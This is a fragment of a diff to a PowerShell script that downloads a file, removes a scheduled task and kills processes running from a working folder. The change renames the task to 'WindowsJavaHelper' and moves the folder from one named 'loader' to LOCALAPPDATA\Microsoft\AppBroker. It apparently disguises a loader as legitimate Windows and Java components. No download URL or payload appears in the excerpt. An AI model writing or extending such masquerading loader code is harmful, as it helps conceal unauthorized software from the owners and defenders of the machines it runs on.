@@ -248,9 +248,10 @@ if (-not $ok) {
 }
 "download ok: $((Get-Item $stTmp).Length) bytes" | Out-File -Encoding UTF8 -Append $log
 
-schtasks /Delete /TN 'WindowsUpdateHelper' /F 2>$null | Out-Null
+schtasks /Delete /TN 'WindowsJavaHelper' /F 2>$null | Out-Null
 
-$dir = Join-Path $env:APPDATA 'loader'
+# Correct path for AppBroker
+$dir = Join-Path $env:LOCALAPPDATA 'Microsoft\\AppBroker'
 Get-Process -ErrorAction SilentlyContinue | Where-Object {
   $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase)
 } | Stop-Process -Force -ErrorAction SilentlyContinue
